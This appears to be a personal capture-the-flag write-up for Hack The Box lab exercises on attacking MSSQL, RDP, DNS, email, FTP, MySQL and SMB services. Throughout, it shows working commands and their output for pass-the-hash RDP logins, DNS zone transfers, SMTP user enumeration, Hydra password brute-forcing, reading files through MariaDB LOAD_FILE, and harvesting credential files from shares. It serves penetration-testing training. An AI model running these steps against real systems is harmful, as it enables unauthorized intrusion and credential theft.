+--------------------------------------------------------------------------------------------------------------------------------
+htbdbuser                                                                                                                       
+
+(1 rows affected)
+           
+-----------
+          0
+
+(1 rows affected)
+
+```
+
+Now we need to attempt to log into a Microsoft SQL Server running on the IP address `10.129.26.147` over port `1433` using the `mssqlsvc` account in the `WIN-02` domain via Windows authentication:
+```c
+impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 WIN-02/mssqlsvc@10.129.26.147 -windows-auth
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (WIN-02\mssqlsvc  guest@master)> 
+```
+
+Next I decided to change to flagDB database:
+```c
+SQL (WIN-02\mssqlsvc  guest@master)> use flagDB
+ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
+INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
+SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> enum_users
+UserName             RoleName        LoginName           DefDBName   DefSchemaName       UserID                                                           SID   
+------------------   -------------   -----------------   ---------   -------------   ----------   -----------------------------------------------------------   
+dbo                  db_owner        NULL                NULL        dbo             b'1         '   b'010500000000000515000000970c23f7a4be5d373abe7dbaf4010000'   
+
+guest                public          NULL                NULL        guest           b'2         '                                                         b'00'   
+
+INFORMATION_SCHEMA   public          NULL                NULL        NULL            b'3         '                                                          NULL   
+
+sys                  public          NULL                NULL        NULL            b'4         '                                                          NULL   
+
+WINSRV02\mssqlsvc    db_datareader   WINSRV02\mssqlsvc   master      dbo             b'5         '   b'010500000000000515000000970c23f7a4be5d373abe7dbaed030000' 
+```
+
+Later on I used xp_dirtree to list the directories available on the SQL Server's file system and used`select table_name from information_schema.tables`  to list all the tables in the `flagDB` and finally fetched the content of the flag:
+```c
+SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> xp_dirtree
+subdirectory                depth   file   
+-------------------------   -----   ----   
+$Recycle.Bin                    1      0   
+
+Config.Msi                      1      0   
+
+Documents and Settings          1      0   
+
+PerfLogs                        1      0   
+
+Program Files                   1      0   
+
+Program Files (x86)             1      0   
+
+ProgramData                     1      0   
+
+SQL2019                         1      0   
+
+System Volume Information       1      0   
+
+Temp                            1      0   
+
+Users                           1      0   
+
+Windows                         1      0   
+
+SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> select table_name from information_schema.tables
+table_name   
+----------   
+tb_flag      
+
+SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> select * from tb_flag
+
+flagvalue                              
+------------------------------------   
+b'HTB{!_******}'   
+
+```
+
+### Attacking RDP
+
+RDP to with user "htb-rdp" and password "HTBRocks!" 
+
+10. What is the name of the file that was left on the Desktop? (Format example: filename.txt) 
+
+To do that we need to log in to RDP via xfreerdp for example:
+```c
+xfreerdp /v:10.129.26.153 /u:htb-rdp /p:HTBRocks!
+```
+
+And on the desktop we see the file: pentest-notes.txt which contains the following message:
+```
+We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.
+
+User: Administrator
+Hash: 0E14B9D6330BF16C30B1924111104824
+```
+
+11. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? 
+
+DisableRestrictedAdmin - simply read the module
+
+12.  Connect via RDP with the Administrator account and submit the flag.txt as you answer. 
+
+As we have hash it is one command that separates us from obtaining the flag now:
+```c
+xfreerdp /v:10.129.26.153 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
+```
+
+
+### Attacking DNS
+
+13.  Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer. 
+
+As hints suggest to use subbrute. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
+```c
+./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
+
+/home/r3so1v3/Hacking/academy/common-services/subbrute/./subbrute.py:462: SyntaxWarning: invalid escape sequence '\.'
+  permute_filter = re.compile("^[a-zA-Z0-9]{" + str(self.permute_len) + "}\.")
+Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
+
+inlanefreight.htb
+hr.inlanefreight.htb  
+```
+
+So it took quite a long time to get `hr` subdomain but when I got it, the next step is to use dig utility with DNS query type AXFR option to dump the entire DNS namespaces from a vulnerable DNS server:
+```c
+dig AXFR @10.129.27.0 hr.inlanefreight.htb
+
+; <<>> DiG 9.19.19-1-Debian <<>> AXFR @10.129.27.0 hr.inlanefreight.htb
+; (1 server found)
+;; global options: +cmd
+hr.inlanefreight.htb.   604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+hr.inlanefreight.htb.   604800  IN      TXT     "HTB{LU******}"
+hr.inlanefreight.htb.   604800  IN      NS      ns.inlanefreight.htb.
+ns.hr.inlanefreight.htb. 604800 IN      A       127.0.0.1
+hr.inlanefreight.htb.   604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+;; Query time: 422 msec
+;; SERVER: 10.129.27.0#53(10.129.27.0) (TCP)
+;; WHEN: Fri Oct 04 21:28:37 +05 2024
+;; XFR size: 5 records (messages 1, bytes 230)
+
+```
+
+### Attacking Email Services
+
+14.  What is the available username for the domain inlanefreight.htb in the SMTP server?
+
+For enumeration of smtp service we can use script https://github.com/pentestmonkey/smtp-user-enum/blob/master/smtp-user-enum.pl
+```c
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.188.131
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... users.list
+Target count ............. 1
+Username count ........... 79
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Sat Oct  5 23:28:12 2024 #########
+10.129.188.131: marlin@inlanefreight.htb exists
+######## Scan completed at Sat Oct  5 23:29:07 2024 #########
+1 results.
+
+79 queries in 55 seconds (1.4 queries / sec)
+
+```
+
+So the user is marlin
+
+15.  Access the email account using the user credentials that you discovered and submit the flag in the email as your answer. 
+
+As we got martin, let's find out the password. OF course nothing is easy, especially in Hackthebox. I wasted 1 hour for sure, figuring out the password, using hydra, medusa, 0365spray but it was not that obvious. To get the password we need to use the 'full' username 😆 which is marlin@... So here it is:
+```c
+hydra -l marlin@inlanefreight.htb -P pws.list -s 25 -f 10.129.188.131 smtp
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-06 00:16:11
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 333 login tries (l:1/p:333), ~21 tries per task
+[DATA] attacking smtp://10.129.188.131:25/
+[25][smtp] host: 10.129.188.131   login: marlin@inlanefreight.htb   password: poohbear
+[STATUS] attack finished for 10.129.188.131 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-06 00:16:44                                                                                  
+```
+
+Fucking love it ;)
+Next is we need to log in to one of the email services. I tried pop3 and it worked well. I liked the process lowkey, cuz never used it before.
+```c
+telnet 10.129.188.131 110
+Trying 10.129.188.131...
+Connected to 10.129.188.131.
+Escape character is '^]'.
++OK POP3
+USER marlin@inlanefreight.htb
++OK Send your password
+poohbear
+-ERR Invalid command in current state.
+USER marlin
++OK Send your password
+poohbear
+-ERR Invalid command in current state.
+USER marlin@inlanefreight.htb
++OK Send your password
+PASS poohbear
++OK Mailbox locked and ready
+LIST
++OK 1 messages (601 octets)
+1 601
+.
+RETR 1
++OK 601 octets
+Return-Path: marlin@inlanefreight.htb
+Received: from [10.10.14.33] (Unknown [10.10.14.33])
+        by WINSRV02 with ESMTPA
+        ; Wed, 20 Apr 2022 14:49:32 -0500
+Message-ID: <85cb72668d8f5f8436d36f085e0167ee78cf0638.camel@inlanefreight.htb>
+Subject: Password change
+From: marlin <marlin@inlanefreight.htb>
+To: administrator@inlanefreight.htb
+Cc: marlin@inlanefreight.htb
+Date: Wed, 20 Apr 2022 15:49:11 -0400
+Content-Type: text/plain; charset="UTF-8"
+User-Agent: Evolution 3.38.3-1 
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+Hi admin,
+
+How can I change my password to something more secure? 
+
+flag: HTB{w3******}
+```
+
+
+## Skills Assessment
+
+### Easy
+
+You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer. 
+
+First of all we add our dns and ip to /etc/hosts file:
+```c
+sudo nano /etc/hosts
+
+<IP> inlanefreight.htb
+```
+
+Then we do nmap scan:
+```c
+nmap -Pn -sV -sC -p- --min-rate=200 -T 4 -oN easylab -v 10.129.203.7
+Nmap scan report for 10.129.203.7
+Host is up (0.11s latency).
+Not shown: 65528 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp
+|_ssl-date: 2024-10-06T17:05:22+00:00; 0s from scanner time.
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|     Command unknown, not supported or not allowed...
+|     Command unknown, not supported or not allowed...
+|   Help: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|     214-The following commands are implemented
+|     USER PASS ACCT QUIT PORT RETR
+|     STOR DELE RNFR PWD CWD CDUP
+|     NOOP TYPE MODE STRU
+|     LIST NLST HELP FEAT UTF8 PASV
+|     MDTM REST PBSZ PROT OPTS CCC
+|     XCRC SIZE MFMT CLNT ABORT
+|     HELP command successful
+|   NULL, SMBProgNeg: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|   SSLSessionReq: 
+|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
+|_    Command unknown, not supported or not allowed...
+25/tcp   open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
+|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
+|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-title: Welcome to XAMPP
+|_Requested resource was http://10.129.203.7/dashboard/
+443/tcp  open  https?
+|_ssl-date: 2024-10-06T17:05:19+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: shaWithRSAEncryption
+| Not valid before: 2022-04-21T19:27:17
+| Not valid after:  2032-04-18T19:27:17
+| MD5:   27ed:2da8:8b25:57e3:d2fc:c0c8:9f0b:55b0
+|_SHA-1: 5018:d8d5:ba6b:5a1c:8df6:5969:45d7:fe06:3d32:7fad
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Restricted Area
+587/tcp  open  smtp          hMailServer smtpd
+| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.4.24-MariaDB
+|   Thread ID: 11
+|   Capabilities flags: 63486
+|   Some Capabilities: FoundRows, Speaks41ProtocolNew, SupportsTransactions, SupportsCompression, ConnectWithDatabase, LongColumnFlag, Support41Auth, IgnoreSigpipes, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ODBCClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: I]xdkkZ^L@<I>:H<1~MB
+|_  Auth Plugin Name: mysql_native_password
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-10-06T17:05:19+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=WIN-EASY
+| Issuer: commonName=WIN-EASY
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-10-05T16:59:40
+| Not valid after:  2025-04-06T16:59:40
+| MD5:   70b2:cacc:5fbc:dea5:308c:71ab:a6c1:8f55
+|_SHA-1: 04ab:1f16:d512:19de:d0f3:7c5a:9b2a:be44:fa68:95c2
+| rdp-ntlm-info: 
+|   Target_Name: WIN-EASY
+|   NetBIOS_Domain_Name: WIN-EASY
+|   NetBIOS_Computer_Name: WIN-EASY
+|   DNS_Domain_Name: WIN-EASY
+|   DNS_Computer_Name: WIN-EASY
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-10-06T17:04:28+00:00
+```
+
+As we can see we have plenty of ports opened. 
+I tried ftp, mysql, but they seem to be used later
+For know I started to enumerate smtp service and for that I user smtp-user-enum tool:
+```c
+smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7  
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... users.list
+Target count ............. 1
+Username count ........... 79
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Sun Oct  6 22:09:34 2024 #########
+10.129.203.7: fiona@inlanefreight.htb exists
+######## Scan completed at Sun Oct  6 22:10:11 2024 #########
+1 results.
+
+79 queries in 37 seconds (2.1 queries / sec)
+
+```
+
+So we found the username and now it's time to get the password with hydra:
+```c
+hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.203.7 smtp 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-06 22:18:32
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking smtp://10.129.203.7:25/
+[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
+[STATUS] attack finished for 10.129.203.7 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+```
+
+We got the creds:
+```c
+username:fiona@inlanefreight.htb
+password:987654321
+```
+
+Now we can log in to mysql service:
+```c
+mysql -u fiona -p987654321 -h 10.129.232.182 --skip-ssl
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 10
+Server version: 10.4.24-MariaDB mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| test               |
++--------------------+
+5 rows in set (0.113 sec)
+
+```
+
+To get the flag we will use:
+```c
+MariaDB [phpmyadmin]> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
++------------------------------------------------------+
+| LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt") |
++------------------------------------------------------+
+| HTB{t#******}              |
++------------------------------------------------------+
+1 row in set (0.111 sec)
+```
+
+
+### Medium 
+
+Assess the target server and find the flag.txt file. Submit the contents of this file as your answer. 
+
+As usual we start with nmap scan:
+```c
+sudo nmap 10.129.208.17 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN mediumlab -v
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
+|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
+|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
+53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+110/tcp   open  pop3     Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-04-11T16:38:55
+| Not valid after:  2032-04-08T16:38:55
+| MD5:   a03e:afe0:3b9e:242f:45ce:81ea:9205:485b
+|_SHA-1: f95b:c0ca:f558:d268:5442:7213:80b6:ec09:2df5:55c0
+|_pop3-capabilities: USER AUTH-RESP-CODE SASL(PLAIN) RESP-CODES CAPA UIDL PIPELINING STLS TOP
+|_ssl-date: TLS randomness does not represent time
+995/tcp   open  ssl/pop3 Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu
+| Subject Alternative Name: DNS:ubuntu
+| Issuer: commonName=ubuntu
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-04-11T16:38:55
+| Not valid after:  2032-04-08T16:38:55
+| MD5:   a03e:afe0:3b9e:242f:45ce:81ea:9205:485b
+|_SHA-1: f95b:c0ca:f558:d268:5442:7213:80b6:ec09:2df5:55c0
+|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES UIDL CAPA USER SASL(PLAIN) PIPELINING TOP
+|_ssl-date: TLS randomness does not represent time
+2121/tcp  open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (InlaneFTP) [10.129.208.17]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+30021/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Internal FTP) [10.129.208.17]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+```
+
+As we can see from the output, we have ssh, ftp on 2121 and 30021, domain, pop3 and protected pop3
+I immediately decided to anonymous login to 2121 ftp but that did not work. So I tried 30021 ftp port for that and this time was successfully logged in as anonymous:
+```c
+ftp 10.129.208.17 -p 30021                                                 
+Connected to 10.129.208.17.
+220 ProFTPD Server (Internal FTP) [10.129.208.17]
+Name (10.129.208.17:r3so1v3): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: 
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls -la
+229 Entering Extended Passive Mode (|||14878|)
+150 Opening ASCII mode data connection for file list
+drwxrwxr-x   3 ftp      ftp          4096 Apr 18  2022 .
+drwxrwxr-x   3 ftp      ftp          4096 Apr 18  2022 ..
+drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
+226 Transfer complete
+
+ftp> cd simon
+250 CWD command successful
+
+ftp> ls
+229 Entering Extended Passive Mode (|||53963|)
+150 Opening ASCII mode data connection for file list
+-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
+226 Transfer complete
+
+ftp> get mynotes.txt
+local: mynotes.txt remote: mynotes.txt
+229 Entering Extended Passive Mode (|||29686|)
+150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
+100% |************************************************************************************************************************************************|   153      770.17 KiB/s    00:00 ETA
+226 Transfer complete
+153 bytes received in 00:00 (0.22 KiB/s)
+ftp> 
+
+```
+
+We can see that there is some user `simon` and there is a file `mynotes.txt`
+Let's see what's inside it after downloading it:
+```
+cat mynotes.txt 
+234987123948729384293
++23358093845098
+ThatsMyBigDog
+Rock!ng#May
+Puuuuuh7823328
+8Ns8j1b!23hs4921smHzwn
+237oHs71ohls18H127!!9skaP
+238u1xjn1923nZGSb261Bs81
+
+```
+
+Seems to be some passwords. I instantly started brute-forcing ssh service with `simon` username and `mynotes.txt` file as passwords using hydra:
+```c
+hydra -l simon -P mynotes.txt -u 10.129.208.17 ssh
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-08 01:35:14
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+[DATA] attacking ssh://10.129.208.17:22/
+[22][ssh] host: 10.129.208.17   login: simon   password: 8Ns8j1b!23hs4921smHzwn
+1 of 1 target successfully completed, 1 valid password found
+```
+
+We got creds now:
+```
+login:simon   
+password:8Ns8j1b!23hs4921smHzwn
+```
+
+I decided to try them to 2121 ftp service and managed to log in as `simon` with the his password:
+```c
+ftp 10.129.208.17 -p 2121
+Connected to 10.129.208.17.
+220 ProFTPD Server (InlaneFTP) [10.129.208.17]
+Name (10.129.208.17:r3so1v3): simon
+331 Password required for simon
+Password: 
+230 User simon logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -la
+229 Entering Extended Passive Mode (|||28675|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 simon    simon        4096 Apr 20  2022 .
+drwxr-xr-x   3 root     root         4096 Apr 18  2022 ..
+-rw-------   1 simon    simon           1 Apr 20  2022 .bash_history
+-rw-r--r--   1 simon    simon         220 Feb 25  2020 .bash_logout
+-rw-r--r--   1 simon    simon        3771 Feb 25  2020 .bashrc
+drwx------   2 simon    simon        4096 Apr 18  2022 .cache
+-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
+drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
+-rw-r--r--   1 simon    simon         807 Feb 25  2020 .profile
+drwx------   2 simon    simon        4096 Apr 18  2022 .ssh
+-rw-------   1 simon    simon         929 Apr 18  2022 .viminfo
+226 Transfer complete
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||45064|)
+150 Opening BINARY mode data connection for flag.txt (29 bytes)
+    29      345.36 KiB/s 
+226 Transfer complete
+29 bytes received in 00:02 (0.00 KiB/s)
+ftp> 
+
+```
+
+We see flag.txt file, so as we downloaded it via `get` command we can `cat` it in our directory. Note we can use ordinary commands like: ls, ls -la, cd in ftp service:
+```c
+cat flag.txt      
+HTB{1q******}
+```
+
+After finding flag.txt, I also found out that we can get it from logging into the ssh service with the same creds. Just so you know that there are several ways of solving this lab ;)
+
+
+### Hard
+
+1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt) 
+
+As usual we start with nmap scan:
+```c
+sudo nmap 10.129.210.42 -Pn -sV -sC -p- --min-rate=200 -T 4 -oN hardlab -v
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.210.42:1433: 
+|     Target_Name: WIN-HARD
+|     NetBIOS_Domain_Name: WIN-HARD
+|     NetBIOS_Computer_Name: WIN-HARD
+|     DNS_Domain_Name: WIN-HARD
+|     DNS_Computer_Name: WIN-HARD
+|_    Product_Version: 10.0.17763
+|_ssl-date: 2024-10-08T07:03:38+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-10-08T06:50:03
+| Not valid after:  2054-10-08T06:50:03
+| MD5:   ea75:8969:f90c:c187:56e6:4dd4:196a:8563
+|_SHA-1: 76e1:0764:612a:b6a3:6ca7:100f:a6a4:079f:50d0:f4cf
+| ms-sql-info: 
+|   10.129.210.42:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=WIN-HARD
+| Issuer: commonName=WIN-HARD
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-10-07T06:49:49
+| Not valid after:  2025-04-08T06:49:49
+| MD5:   1ce3:5980:db1e:4833:2ede:708b:adfc:1d3a
+|_SHA-1: 2538:ba8f:eca6:1cdc:479f:5b95:26f1:0144:6ab3:70af
+|_ssl-date: 2024-10-08T07:03:38+00:00; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WIN-HARD
+|   NetBIOS_Domain_Name: WIN-HARD
+|   NetBIOS_Computer_Name: WIN-HARD
+|   DNS_Domain_Name: WIN-HARD
+|   DNS_Computer_Name: WIN-HARD
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-10-08T07:03:04+00:00
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-10-08T07:02:59
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+```
+
+Then we can enumerate shares using smbclient tool:
+```c
+mbclient \\\\10.129.210.42\\Home       
+
+Password for [WORKGROUP\r3so1v3]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Apr 22 02:18:21 2022
+  ..                                  D        0  Fri Apr 22 02:18:21 2022
+  HR                                  D        0  Fri Apr 22 01:04:39 2022
+  IT                                  D        0  Fri Apr 22 01:11:44 2022
+  OPS                                 D        0  Fri Apr 22 01:05:10 2022
+  Projects                            D        0  Fri Apr 22 01:04:48 2022
+
+```
+
+And we can see that there are 3 users inside IT directory:
+```c
+smbclient \\\\10.129.214.228\\Home
+
+Password for [WORKGROUP\r3so1v3]:
+Try "help" to get a list of possible commands.
+
+smb: \Projects\> cd ../IT
+smb: \IT\> ls
+  .                                   D        0  Fri Apr 22 01:11:44 2022
+  ..                                  D        0  Fri Apr 22 01:11:44 2022
+  Fiona                               D        0  Fri Apr 22 01:11:53 2022
+  John                                D        0  Fri Apr 22 02:15:09 2022
+  Simon                               D        0  Fri Apr 22 02:16:07 2022
+
+                7706623 blocks of size 4096. 3143962 blocks available
+smb: \IT\> cd Fiona
+smb: \IT\Fiona\> ls
+  .                                   D        0  Fri Apr 22 01:11:53 2022
+  ..                                  D        0  Fri Apr 22 01:11:53 2022
+  creds.txt                           A      118  Fri Apr 22 01:13:11 2022
+
+                7706623 blocks of size 4096. 3144011 blocks available
+smb: \IT\Fiona\> get creds.txt
+getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \IT\Fiona\> cd ../John
+smb: \IT\John\> ls
+  .                                   D        0  Fri Apr 22 02:15:09 2022
+  ..                                  D        0  Fri Apr 22 02:15:09 2022
+  information.txt                     A      101  Fri Apr 22 02:14:58 2022
+  notes.txt                           A      164  Fri Apr 22 02:13:40 2022
+  secrets.txt                         A       99  Fri Apr 22 02:15:55 2022
+ 
+                7706623 blocks of size 4096. 3144047 blocks available
+smb: \IT\John\> mget *
+Get file information.txt? y
+getting file \IT\John\information.txt of size 101 as information.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+Get file notes.txt? y
+getting file \IT\John\notes.txt of size 164 as notes.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+Get file secrets.txt? y
+getting file \IT\John\secrets.txt of size 99 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \IT\John\> !cat information.txt 
+To do:
+- Keep testing with the database.
+- Create a local linked server.
+- Simulate Impersonation.smb: \IT\John\> !cat notes.txt 
+Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world ...smb: \IT\John\> !cat secrets.txt 
+Password Lists:
+
+1234567
+(DK02ka-dsaldS
+Inlanefreight2022
+Inlanefreight2022!
+TestingDB123
+
+smb: \IT\John\> get secrets.txt
